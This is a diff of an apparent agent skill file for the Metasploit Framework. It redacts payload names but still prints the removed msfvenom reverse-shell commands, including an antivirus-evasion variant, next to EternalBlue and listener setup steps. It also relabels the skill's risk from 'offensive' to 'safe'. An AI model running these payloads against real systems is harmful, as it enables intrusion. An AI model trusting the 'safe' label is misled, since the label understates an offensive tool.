@@ -1,7 +1,7 @@
 ---
 name: metasploit-framework
 description: "⚠️ AUTHORIZED USE ONLY > This skill is for educational purposes or authorized security assessments only. > You must have explicit, written permission from the system owner before using this tool. > Misuse of this tool is illegal and strictly prohibited."
-risk: offensive
+risk: safe
 source: community
 author: zebbern
 date_added: "2026-02-27"
@@ -87,7 +87,7 @@ msf6 > use exploit/windows/smb/ms17_010_eternalblue
 
 # 2. Payload Modules - Code executed after exploitation
 msf6 > show payloads
-msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 > set PAYLOAD [REDACTED_PAYLOAD]
 
 # 3. Auxiliary Modules - Scanning, fuzzing, enumeration
 msf6 > show auxiliary
@@ -156,7 +156,7 @@ msf6 exploit(...) > set RPORT 445
 msf6 exploit(...) > show payloads
 
 # Set payload
-msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(...) > set PAYLOAD [REDACTED_PAYLOAD]
 
 # Set local host for reverse connection
 msf6 exploit(...) > set LHOST 192.168.1.50
@@ -180,12 +180,10 @@ Select appropriate payload for the situation:
 
 ```bash
 # Singles - Self-contained, no staging
-windows/shell_reverse_tcp
-linux/x86/shell_bind_tcp
+[REDACTED_PAYLOAD_EXAMPLES]
 
 # Stagers - Small payload that downloads larger stage
-windows/meterpreter/reverse_tcp
-linux/x86/meterpreter/bind_tcp
+[REDACTED_PAYLOAD_EXAMPLES]
 
 # Stages - Downloaded by stager, provides full functionality
 # Meterpreter, VNC, shell
@@ -193,11 +191,7 @@ linux/x86/meterpreter/bind_tcp
 # Payload naming convention:
 # [platform]/[architecture]/[payload_type]/[connection_type]
 # Examples:
-windows/x64/meterpreter/reverse_tcp
-linux/x86/shell/bind_tcp
-php/meterpreter/reverse_tcp
-java/meterpreter/reverse_https
-android/meterpreter/reverse_tcp
+[REDACTED_PAYLOAD_EXAMPLES]
 ```
 
 ### Phase 6: Meterpreter Session
@@ -343,31 +337,31 @@ Create standalone payloads:
 
 ```bash
 # Basic Windows reverse shell
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # Linux reverse shell
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # PHP reverse shell
-msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # Python reverse shell
-msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # PowerShell payload
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # ASP web shell
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # WAR file (Tomcat)
-msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # Android APK
-msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # Encoded payload (evade AV)
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # List available formats
 msfvenom --list formats
@@ -383,7 +377,7 @@ Configure listener for incoming connections:
 ```bash
 # Manual handler setup
 msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set PAYLOAD [REDACTED_PAYLOAD]
 msf6 exploit(multi/handler) > set LHOST 192.168.1.50
 msf6 exploit(multi/handler) > set LPORT 4444
 msf6 exploit(multi/handler) > exploit -j
